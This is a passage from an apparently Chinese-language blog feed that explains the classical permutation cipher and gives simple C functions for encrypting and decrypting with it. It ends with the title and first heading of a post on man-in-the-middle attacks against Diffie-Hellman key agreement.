style="height:1.19248em;vertical-align:-0.25em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span>。</li>
</ul>
<h3 id="密码体制-6"><a class="markdownIt-Anchor" href="#密码体制-6"></a> 密码体制</h3>
<ul>
<li>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>为一正整数。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>Z</mi><mn>26</mn></msub><msup><mo stretchy="false">)</mo><mi>m</mi></msup></mrow><annotation encoding="application/x-tex">P=C=(Z_{26})^m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">K\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>是由所有定义在集合<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{1,2,\cdots ,m\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mclose">}</span></span></span></span>上的置换组成。对任意的密钥（即置换）<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span></span></span></span>，定义：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>π</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><msub><mi>π</mi><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msub></msub><mo separator="true">,</mo><msub><mi>x</mi><msub><mi>π</mi><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msub></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>x</mi><msub><mi>π</mi><mrow><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msub></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_{\pi}(x_1,x_2,\cdots ,x_m)=(x_{\pi_{(1)}},x_{\pi_{(2)}},\cdots,x_{\pi_{(m)}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1586400000000001em;vertical-align:-0.40864em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3447999999999998em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5357142857142856em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3694857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.40864em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3447999999999998em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5357142857142856em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3694857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.40864em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3447999999999998em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5357142857142856em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">m</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3694857142857143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.40864em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>π</mi></msub><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msub><mo separator="true">,</mo><msub><mi>y</mi><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></msub><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msub><mi>y</mi><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_{\pi}(y_1,y_2,\cdots,y_m)=(y_{\pi^{-1}(1)},y_{\pi^{-1}(2)},\cdots,y_{\pi^{-1}(m)})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mtight">2</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">m</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\pi^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>为置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span></span></span></span>的逆置换。</li>
</ul>
<h3 id="代码实现-6"><a class="markdownIt-Anchor" href="#代码实现-6"></a> 代码实现</h3>
<ul>
<li>
<p>代码加密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> t,k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的明文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    t=k-len%k; <span class="comment">//补全位数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">        p[len+i]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;(len+t)/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[x[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len+t; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>加密效果：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418225710.png" alt="alt 置换密码加密" /></p>
</li>
<li>
<p>代码解密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的密文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> y[<span class="number">26</span>];<span class="comment">//逆置换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x[j]==(i+<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  y[i]=j+<span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;len/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[y[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>解密效果：</p>
<p>同加密函数内容基本一样，区别在于将使用的置换更换为输入置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span></span></span></span>的逆置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\pi^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418231325.png" alt="alt 置换密码解密" /></p>
</li>
</ul>
<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
<ul>
<li><a href="https://blog.csdn.net/weixin_44883180/article/details/109009221">几种古典密码学算法的C实现</a></li>
<li><a href="https://blog.csdn.net/qq_45163122/article/details/104482811">希尔（Hill）密码（C语言）</a></li>
<li><a href="https://blog.csdn.net/dyw_666666/article/details/82466894">置换密码代码简单实现（C语言）</a></li>
</ul>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>基于DH密钥协商的中间人攻击</title>
    <url>/2021/06/19/%E5%9F%BA%E4%BA%8EDH%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<hr />
<h1 id="基本原理"><a class="markdownIt-Anchor" href="#基本原理"></a> 基本原理</h1>
